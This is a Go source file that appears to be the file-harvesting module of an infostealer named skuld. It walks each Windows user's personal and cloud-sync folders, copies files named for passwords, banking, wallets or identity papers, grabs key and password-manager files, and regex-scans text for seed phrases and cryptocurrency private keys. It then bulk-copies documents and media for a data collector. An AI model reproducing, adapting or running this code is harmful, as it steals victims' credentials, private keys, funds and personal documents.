package commonfiles

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(dataCollector *collector.DataCollector) {
	CaptureImportantFiles(dataCollector)
	CaptureCryptoFiles(dataCollector)
	CaptureAllUserFiles(dataCollector)
	CaptureDesktopFiles(dataCollector)
}

func CaptureImportantFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "important-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Enhanced file extensions to capture
	extensions := []string{
		".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".sqlite", ".sql",
		".key", ".pem", ".p12", ".keystore", ".dat", ".wallet", ".backup", 
		".bak", ".aes", ".gpg", ".pgp", ".kdb", ".kdbx", ".1password",
		".lastpass", ".dashlane", ".bitwarden", ".keepass", ".enpass",
	}
	
	// Enhanced keywords for important files
	keywords := []string{
		"account", "password", "secret", "mdp", "motdepass", "mot_de_pass",
		"login", "paypal", "banque", "seed", "banque", "bancaire", "bank",
		"metamask", "wallet", "crypto", "exodus", "atomic", "auth", "mfa",
		"2fa", "code", "memo", "compte", "token", "password", "credit",
		"card", "mail", "address", "phone", "permis", "number", "backup",
		"database", "config", "bitcoin", "ethereum", "private", "key",
		"mnemonic", "phrase", "recovery", "electrum", "jaxx", "coinbase",
		"binance", "trust", "phantom", "solana", "polygon", "bsc",
		"personal", "important", "confidential", "sensitive", "secure",
		"financial", "tax", "invoice", "receipt", "contract", "agreement",
		"passport", "license", "certificate", "diploma", "resume", "cv",
	}

	found := 0
	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		// Search in multiple directories
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
			filepath.Join(user, "Dropbox"),
			filepath.Join(user, "Google Drive"),
			filepath.Join(user, "iCloud Drive"),
		}
		
		for _, dir := range searchDirs {
			if _, err := os.Stat(dir); err != nil {
				continue
			}
			
			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() > 100*1024*1024 { // 100MB limit
					return nil
				}

				fileName := strings.ToLower(info.Name())
				fileExt := strings.ToLower(filepath.Ext(fileName))
				
				// Check if file has interesting extension
				hasValidExt := false
				for _, ext := range extensions {
					if fileExt == ext {
						hasValidExt = true
						break
					}
				}

				if !hasValidExt {
					return nil
				}

				// Check for keywords or always copy certain file types
				shouldCopy := false
				
				// Always copy these file types
				importantExts := []string{".key", ".pem", ".p12", ".keystore", ".dat", ".wallet", ".backup", ".bak", ".aes", ".gpg", ".pgp", ".kdb", ".kdbx"}
				for _, ext := range importantExts {
					if fileExt == ext {
						shouldCopy = true
						break
					}
				}

				// Check for keywords in filename
				if !shouldCopy {
					for _, keyword := range keywords {
						if strings.Contains(fileName, keyword) {
							shouldCopy = true
							break
						}
					}
				}

				if shouldCopy {
					destPath := filepath.Join(tempDir, userName, filepath.Base(dir), info.Name())
					if fileutil.Exists(destPath) {
						destPath = filepath.Join(tempDir, userName, filepath.Base(dir), fmt.Sprintf("%s_%s", randString(4), info.Name()))
					}
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					err := fileutil.CopyFile(path, destPath)
					if err == nil {
						found++
					}
				}
				return nil
			})
		}
	}

	if found > 0 {
		filesInfo := map[string]interface{}{
			"ImportantFilesFound": found,
			"TreeView":            fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("important_files", filesInfo)
		dataCollector.AddDirectory("important_files", tempDir, "important_files")
	}
}

func CaptureCryptoFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "crypto-detection-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Enhanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
		"polygon_address":       regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"avalanche_address":     regexp.MustCompile(`X-avax1[a-z0-9]{38}`),
		"cosmos_address":        regexp.MustCompile(`cosmos1[a-z0-9]{38}`),
		"polkadot_address":      regexp.MustCompile(`1[a-zA-Z0-9]{47}`),
		"chainlink_address":     regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"uniswap_address":       regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Check text files and some binary formats
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 10*1024*1024 { // 10MB limit
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						// Store actual matches for analysis
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create detailed analysis file
		summaryPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
		summaryContent := "🔍 CRYPTO FILES ANALYSIS\n"
		summaryContent += "========================\n\n"
		summaryContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
		
		for fileName, matches := range suspiciousFiles {
			summaryContent += fmt.Sprintf("📄 File: %s\n", fileName)
			summaryContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			summaryContent += "---\n\n"
		}
		
		// Add found crypto data
		if len(cryptoData) > 0 {
			summaryContent += "\n💰 FOUND CRYPTO DATA\n"
			summaryContent += "===================\n\n"
			for key, value := range cryptoData {
				summaryContent += fmt.Sprintf("%s: %s\n", key, value)
			}
		}
		
		fileutil.AppendFile(summaryPath, summaryContent)

		cryptoInfo := map[string]interface{}{
			"CryptoFilesFound":  found,
			"SuspiciousFiles":   suspiciousFiles,
			"CryptoDataFound":   cryptoData,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_detection", cryptoInfo)
		dataCollector.AddDirectory("crypto_detection", tempDir, "crypto_detection")
	}
}

func CaptureAllUserFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "all-user-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// File types to capture
	allowedExts := map[string]bool{
		".txt": true, ".pdf": true, ".doc": true, ".docx": true,
		".xls": true, ".xlsx": true, ".ppt": true, ".pptx": true,
		".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true,
		".mp4": true, ".avi": true, ".mov": true, ".mkv": true, ".wmv": true,
		".mp3": true, ".wav": true, ".flac": true, ".aac": true,
		".json": true, ".csv": true, ".xml": true, ".html": true,
		".zip": true, ".rar": true, ".7z": true, ".tar": true, ".gz": true,
		".key": true, ".pem": true, ".p12": true, ".keystore": true,
		".dat": true, ".wallet": true, ".backup": true, ".bak": true,
		".db": true, ".sqlite": true, ".sql": true, ".mdb": true,
	}

	// File types to exclude
	excludedExts := map[string]bool{
		".exe": true, ".dll": true, ".sys": true, ".msi": true,
		".bat": true, ".cmd": true, ".scr": true, ".com": true,
		".pif": true, ".lnk": true, ".url": true, ".tmp": true,
		".log": true, ".cache": true, ".temp": true,
	}

	totalFiles := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			dirName := filepath.Base(dir)
			userDestDir := filepath.Join(tempDir, userName, dirName)

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip very large files (>200MB)
				if info.Size() > 200*1024*1024 {
					return nil
				}

				ext := strings.ToLower(filepath.Ext(info.Name()))
				
				// Skip excluded file types
				if excludedExts[ext] {
					return nil
				}

				// Only copy allowed file types or files without extension
				if ext != "" && !allowedExts[ext] {
					return nil
				}

				// Create relative path
				relPath, err := filepath.Rel(dir, path)
				if err != nil {
					return nil
				}

				destPath := filepath.Join(userDestDir, relPath)
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

				if err := fileutil.CopyFile(path, destPath); err == nil {
					totalFiles++
					totalSize += info.Size()
				}

				return nil
			})
		}
	}

	if totalFiles > 0 {
		userFilesInfo := map[string]interface{}{
			"TotalFiles":     totalFiles,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("all_user_files", userFilesInfo)
		dataCollector.AddDirectory("all_user_files", tempDir, "all_user_files")
	}
}

func CaptureDesktopFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "desktop-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	totalFiles := 0

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		desktopDir := filepath.Join(user, "Desktop")
		
		if !fileutil.IsDir(desktopDir) {
			continue
		}

		userDestDir := filepath.Join(tempDir, userName, "Desktop")
		os.MkdirAll(userDestDir, os.ModePerm)

		files, err := os.ReadDir(desktopDir)
		if err != nil {
			continue
		}

		for _, file := range files {
			if file.IsDir() {
				continue
			}

			sourcePath := filepath.Join(desktopDir, file.Name())
			destPath := filepath.Join(userDestDir, file.Name())

			// Skip large files
			info, err := file.Info()
			if err != nil || info.Size() > 100*1024*1024 { // 100MB
				continue
			}

			if err := fileutil.CopyFile(sourcePath, destPath); err == nil {
				totalFiles++
			}
		}
	}

	if totalFiles > 0 {
		desktopInfo := map[string]interface{}{
			"DesktopFilesFound": totalFiles,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("desktop_files", desktopInfo)
		dataCollector.AddDirectory("desktop_files", tempDir, "desktop_files")
	}
}

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}